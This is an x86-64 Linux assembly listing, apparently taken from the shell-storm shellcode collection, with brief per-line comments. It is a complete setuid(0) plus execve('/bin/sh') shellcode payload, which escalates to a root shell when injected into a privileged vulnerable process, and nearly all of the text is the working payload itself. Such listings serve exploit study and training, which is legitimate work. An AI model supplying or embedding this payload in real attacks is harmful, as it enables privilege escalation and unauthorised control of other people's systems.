; http://shell-storm.org/shellcode/files/shellcode-77.php
; Intel Syntax



global _start

section .text

_start:
							; analysis by comment
	xor rdi, rdi					; setuid(first arg)
	mov al, 0x69					; setuid sys call
	syscall						; syscall

	xor rdx, rdx					; execve third arg
	mov rbx, 0x68732f6e69622fff		
	shr rbx, 0x8					; /bin/sh
	push rbx
	mov rdi, rsp					; execve first arg
	xor rax, rax
	push rax
	push rdi
	mov rsi, rsp					; execve second arg
	mov al, 0x3b
	syscall						; execve syscall

	push 0x1
	pop rdi						; exit status = 1, exit syscall first arg
	push 0x3c
	pop rax						; exit syscall
	syscall						; syscall	
